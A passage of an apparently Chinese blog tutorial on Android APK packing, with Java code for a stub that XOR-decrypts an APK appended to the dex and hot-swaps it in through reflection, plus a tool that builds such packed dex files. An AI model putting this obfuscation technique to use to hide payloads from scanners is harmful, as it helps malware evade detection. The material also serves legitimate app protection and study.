class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        loadResources(apkFileName);</span><br><span class="line">        Log.i(<span class="string">"demo"</span>, <span class="string">"onCreate"</span>);</span><br><span class="line"></span><br><span class="line">        String appClassName = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ApplicationInfo ai = <span class="keyword">this</span>.getPackageManager()</span><br><span class="line">                    .getApplicationInfo(<span class="keyword">this</span>.getPackageName(), PackageManager.GET_META_DATA);</span><br><span class="line">            Bundle bundle = ai.metaData;</span><br><span class="line">            <span class="keyword">if</span> (bundle != <span class="keyword">null</span> &amp;&amp; bundle.containsKey(appkey)) &#123;</span><br><span class="line">                appClassName = bundle.getString(appkey);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Log.i(<span class="string">"demo"</span>, <span class="string">"have no application class name"</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NameNotFoundException e) &#123;</span><br><span class="line">            Log.i(<span class="string">"demo"</span>, <span class="string">"error:"</span> + Log.getStackTraceString(e));</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object currentActivityThread = RefInvoke.invokeStaticMethod(</span><br><span class="line">                <span class="string">"android.app.ActivityThread"</span>, <span class="string">"currentActivityThread"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        Object mBoundApplication = RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">"android.app.ActivityThread"</span>, currentActivityThread,</span><br><span class="line">                <span class="string">"mBoundApplication"</span>);</span><br><span class="line">        Object loadedApkInfo = RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">"android.app.ActivityThread$AppBindData"</span>,</span><br><span class="line">                mBoundApplication, <span class="string">"info"</span>);</span><br><span class="line"></span><br><span class="line">        RefInvoke.setFieldObject(<span class="string">"android.app.LoadedApk"</span>, <span class="string">"mApplication"</span>,</span><br><span class="line">                loadedApkInfo, <span class="keyword">null</span>);</span><br><span class="line">        Object oldApplication = RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">"android.app.ActivityThread"</span>, currentActivityThread,</span><br><span class="line">                <span class="string">"mInitialApplication"</span>);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Application&gt; mAllApplications = (ArrayList&lt;Application&gt;) RefInvoke</span><br><span class="line">                .getFieldOjbect(<span class="string">"android.app.ActivityThread"</span>,</span><br><span class="line">                        currentActivityThread, <span class="string">"mAllApplications"</span>);</span><br><span class="line">        <span class="keyword">assert</span> mAllApplications != <span class="keyword">null</span>;</span><br><span class="line">        mAllApplications.remove(oldApplication);</span><br><span class="line">        ApplicationInfo appinfo_In_LoadedApk = (ApplicationInfo) RefInvoke</span><br><span class="line">                .getFieldOjbect(<span class="string">"android.app.LoadedApk"</span>, loadedApkInfo,</span><br><span class="line">                        <span class="string">"mApplicationInfo"</span>);</span><br><span class="line">        ApplicationInfo appinfo_In_AppBindData = (ApplicationInfo) RefInvoke</span><br><span class="line">                .getFieldOjbect(<span class="string">"android.app.ActivityThread$AppBindData"</span>,</span><br><span class="line">                        mBoundApplication, <span class="string">"appInfo"</span>);</span><br><span class="line">        <span class="keyword">assert</span> appinfo_In_LoadedApk != <span class="keyword">null</span>;</span><br><span class="line">        appinfo_In_LoadedApk.className = appClassName;</span><br><span class="line">        <span class="keyword">assert</span> appinfo_In_AppBindData != <span class="keyword">null</span>;</span><br><span class="line">        appinfo_In_AppBindData.className = appClassName;</span><br><span class="line">        Application app = (Application) RefInvoke.invokeMethod(</span><br><span class="line">                <span class="string">"android.app.LoadedApk"</span>, <span class="string">"makeApplication"</span>, loadedApkInfo,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;<span class="keyword">boolean</span>.class, Instrumentation.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">false</span>, <span class="keyword">null</span>&#125;);</span><br><span class="line">        RefInvoke.setFieldObject(<span class="string">"android.app.ActivityThread"</span>,</span><br><span class="line">                <span class="string">"mInitialApplication"</span>, currentActivityThread, app);</span><br><span class="line">        ArrayMap mProviderMap = (ArrayMap) RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">"android.app.ActivityThread"</span>, currentActivityThread,</span><br><span class="line">                <span class="string">"mProviderMap"</span>);</span><br><span class="line">        <span class="keyword">assert</span> mProviderMap != <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (Object providerClientRecord : mProviderMap.values()) &#123;</span><br><span class="line">            Object localProvider = RefInvoke.getFieldOjbect(</span><br><span class="line">                    <span class="string">"android.app.ActivityThread$ProviderClientRecord"</span>,</span><br><span class="line">                    providerClientRecord, <span class="string">"mLocalProvider"</span>);</span><br><span class="line">            RefInvoke.setFieldObject(<span class="string">"android.content.ContentProvider"</span>,</span><br><span class="line">                    <span class="string">"mContext"</span>, localProvider, app);</span><br><span class="line">        &#125;</span><br><span class="line">        Log.i(<span class="string">"demo"</span>, <span class="string">"app:"</span> + app);</span><br><span class="line">        <span class="keyword">assert</span> app != <span class="keyword">null</span>;</span><br><span class="line">        app.onCreate();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">splitPayLoadFromDex</span><span class="params">(<span class="keyword">byte</span>[] apkdata)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ablen = apkdata.length;</span><br><span class="line">        <span class="keyword">byte</span>[] dexlen = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">        System.arraycopy(apkdata, ablen - <span class="number">4</span>, dexlen, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(dexlen);</span><br><span class="line">        DataInputStream in = <span class="keyword">new</span> DataInputStream(bais);</span><br><span class="line">        <span class="keyword">int</span> readInt = in.readInt();</span><br><span class="line">        System.out.println(Integer.toHexString(readInt));</span><br><span class="line">        <span class="keyword">byte</span>[] newdex = <span class="keyword">new</span> <span class="keyword">byte</span>[readInt];</span><br><span class="line">        System.arraycopy(apkdata, ablen - <span class="number">4</span> - readInt, newdex, <span class="number">0</span>, readInt);</span><br><span class="line">        newdex = decrypt(newdex);</span><br><span class="line">        File file = <span class="keyword">new</span> File(apkFileName);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream localFileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">            localFileOutputStream.write(newdex);</span><br><span class="line">            localFileOutputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException localIOException) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(localIOException);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ZipInputStream localZipInputStream = <span class="keyword">new</span> ZipInputStream(</span><br><span class="line">                <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(file)));</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            ZipEntry localZipEntry = localZipInputStream.getNextEntry();</span><br><span class="line">            <span class="keyword">if</span> (localZipEntry == <span class="keyword">null</span>) &#123;</span><br><span class="line">                localZipInputStream.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String name = localZipEntry.getName();</span><br><span class="line">            <span class="keyword">if</span> (name.startsWith(<span class="string">"lib/"</span>) &amp;&amp; name.endsWith(<span class="string">".so"</span>)) &#123;</span><br><span class="line">                File storeFile = <span class="keyword">new</span> File(libPath + <span class="string">"/"</span></span><br><span class="line">                        + name.substring(name.lastIndexOf(<span class="string">'/'</span>)));</span><br><span class="line">                storeFile.createNewFile();</span><br><span class="line">                FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(storeFile);</span><br><span class="line">                <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">int</span> i = localZipInputStream.read(arrayOfByte);</span><br><span class="line">                    <span class="keyword">if</span> (i == -<span class="number">1</span>)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    fos.write(arrayOfByte, <span class="number">0</span>, i);</span><br><span class="line">                &#125;</span><br><span class="line">                fos.flush();</span><br><span class="line">                fos.close();</span><br><span class="line">            &#125;</span><br><span class="line">            localZipInputStream.closeEntry();</span><br><span class="line">        &#125;</span><br><span class="line">        localZipInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] readDexFileFromApk() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream dexByteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ZipInputStream localZipInputStream = <span class="keyword">new</span> ZipInputStream(</span><br><span class="line">                <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(</span><br><span class="line">                        <span class="keyword">this</span>.getApplicationInfo().sourceDir)));</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            ZipEntry localZipEntry = localZipInputStream.getNextEntry();</span><br><span class="line">            <span class="keyword">if</span> (localZipEntry == <span class="keyword">null</span>) &#123;</span><br><span class="line">                localZipInputStream.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (localZipEntry.getName().equals(<span class="string">"classes.dex"</span>)) &#123;</span><br><span class="line">                <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">int</span> i = localZipInputStream.read(arrayOfByte);</span><br><span class="line">                    <span class="keyword">if</span> (i == -<span class="number">1</span>)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    dexByteArrayOutputStream.write(arrayOfByte, <span class="number">0</span>, i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            localZipInputStream.closeEntry();</span><br><span class="line">        &#125;</span><br><span class="line">        localZipInputStream.close();</span><br><span class="line">        <span class="keyword">return</span> dexByteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] srcdata) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;srcdata.length;i++)&#123;</span><br><span class="line">            srcdata[i] = (<span class="keyword">byte</span>)(<span class="number">0xFF</span> ^ srcdata[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> srcdata;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> AssetManager mAssetManager;</span><br><span class="line">    <span class="keyword">protected</span> Resources mResources;</span><br><span class="line">    <span class="keyword">protected</span> Theme mTheme;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">loadResources</span><span class="params">(String dexPath)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            AssetManager assetManager = AssetManager.class.newInstance();</span><br><span class="line">            Method addAssetPath = assetManager.getClass().getMethod(<span class="string">"addAssetPath"</span>, String.class);</span><br><span class="line">            addAssetPath.invoke(assetManager, dexPath);</span><br><span class="line">            mAssetManager = assetManager;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.i(<span class="string">"inject"</span>, <span class="string">"loadResource error:"</span>+Log.getStackTraceString(e));</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Resources superRes = <span class="keyword">super</span>.getResources();</span><br><span class="line">        superRes.getDisplayMetrics();</span><br><span class="line">        superRes.getConfiguration();</span><br><span class="line">        mResources = <span class="keyword">new</span> Resources(mAssetManager, superRes.getDisplayMetrics(),superRes.getConfiguration());</span><br><span class="line">        mTheme = mResources.newTheme();</span><br><span class="line">        mTheme.setTo(<span class="keyword">super</span>.getTheme());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> AssetManager <span class="title">getAssets</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mAssetManager == <span class="keyword">null</span> ? <span class="keyword">super</span>.getAssets() : mAssetManager;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Resources <span class="title">getResources</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mResources == <span class="keyword">null</span> ? <span class="keyword">super</span>.getResources() : mResources;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Theme <span class="title">getTheme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mTheme == <span class="keyword">null</span> ? <span class="keyword">super</span>.getTheme() : mTheme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RefInvoke</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> Object <span class="title">invokeStaticMethod</span><span class="params">(String class_name, String method_name, Class[] pareTyple, Object[] pareVaules)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class obj_class = Class.forName(class_name);</span><br><span class="line">            Method method = obj_class.getDeclaredMethod(method_name, pareTyple);</span><br><span class="line">            method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(<span class="keyword">null</span>, pareVaules);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> Object <span class="title">invokeMethod</span><span class="params">(String class_name, String method_name, Object obj, Class[] pareTyple, Object[] pareVaules)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class obj_class = Class.forName(class_name);</span><br><span class="line">            Method method = obj_class.getDeclaredMethod(method_name, pareTyple);</span><br><span class="line">            method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(obj, pareVaules);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> Object <span class="title">getFieldOjbect</span><span class="params">(String class_name, Object obj, String filedName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class obj_class = Class.forName(class_name);</span><br><span class="line">            Field field = obj_class.getDeclaredField(filedName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldObject</span><span class="params">(String classname, String filedName, Object obj, Object filedVaule)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class obj_class = Class.forName(classname);</span><br><span class="line">            Field field = obj_class.getDeclaredField(filedName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(obj, filedVaule);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里要注意的是，manifest里的入口activity要写那个源apk的入口activity。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta-data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"APPLICATION_CLASS_NAME"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">"com.xxx.xxx.MyApplication"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"com.xxx.xxx.MainActivity"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="加密-拼装工具"><a href="#加密-拼装工具" class="headerlink" title="加密+拼装工具"></a>加密+拼装工具</h4><p>这个就是把源apk和壳的dex拼在一起，并加密，变成新的壳的dex，并修正dex头中<strong>checksum</strong>、<strong>signature</strong>、<strong>file_size</strong>的值。</p><p>新dex结构：</p><table><thead><tr><th style="text-align:center">dex</th></tr></thead><tbody><tr><td style="text-align:center">…</td></tr><tr><td style="text-align:center">checksum</td></tr><tr><td style="text-align:center">signature</td></tr><tr><td style="text-align:center">file_size</td></tr><tr><td style="text-align:center">…</td></tr><tr><td style="text-align:center">壳的dex</td></tr><tr><td style="text-align:center">源程序的apk</td></tr><tr><td style="text-align:center">源程序apk的大小</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ssjShellTool</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] intToByte(<span class="keyword">int</span> number) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>]; </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--) &#123; </span><br><span class="line">            b[i] = (<span class="keyword">byte</span>) (number % <span class="number">256</span>); </span><br><span class="line">            number &gt;&gt;= <span class="number">8</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> b; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File payloadSrcFile = <span class="keyword">new</span> File(<span class="string">"force/source.apk"</span>);</span><br><span class="line">            System.out.println(<span class="string">"apk size:"</span>+payloadSrcFile.length());</span><br><span class="line">            File unShellDexFile = <span class="keyword">new</span> File(<span class="string">"force/shell.dex"</span>);</span><br><span class="line">            System.out.println(<span class="string">"dex size:"</span>+unShellDexFile.length());</span><br><span class="line">            <span class="keyword">byte</span>[] payloadArray = encrpt(readFileBytes(payloadSrcFile));</span><br><span class="line">            <span class="keyword">byte</span>[] unShellDexArray = readFileBytes(unShellDexFile);</span><br><span class="line">            <span class="keyword">int</span> payloadLen = payloadArray.length;</span><br><span class="line">            <span class="keyword">int</span> unShellDexLen = unShellDexArray.length;</span><br><span class="line">            <span class="keyword">int</span> totalLen = payloadLen + unShellDexLen + <span class="number">4</span>;</span><br><span class="line">            System.out.println(<span class="string">"tot size:"</span>+totalLen);</span><br><span class="line">            <span class="keyword">byte</span>[] newdex = <span class="keyword">new</span> <span class="keyword">byte</span>[totalLen];</span><br><span class="line">            </span><br><span class="line">            System.arraycopy(unShellDexArray, <span class="number">0</span>, newdex, <span class="number">0</span>, unShellDexLen);</span><br><span class="line">            System.arraycopy(payloadArray, <span class="number">0</span>, newdex, unShellDexLen, payloadLen);</span><br><span class="line">            System.arraycopy(intToByte(payloadLen), <span class="number">0</span>, newdex, totalLen-<span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">            fixFileSizeHeader(newdex);</span><br><span class="line">            fixSHA1Header(newdex);</span><br><span class="line">            fixCheckSumHeader(newdex);</span><br><span class="line"></span><br><span class="line">            String str = <span class="string">"force/classes.dex"</span>;</span><br><span class="line">            File file = <span class="keyword">new</span> File(str);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            FileOutputStream localFileOutputStream = <span class="keyword">new</span> FileOutputStream(str);</span><br><span class="line">            localFileOutputStream.write(newdex);</span><br><span class="line">            localFileOutputStream.flush();</span><br><span class="line">            localFileOutputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"finish"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//此处加密</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encrpt(<span class="keyword">byte</span>[] srcdata)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;srcdata.length;i++)&#123;</span><br><span class="line">            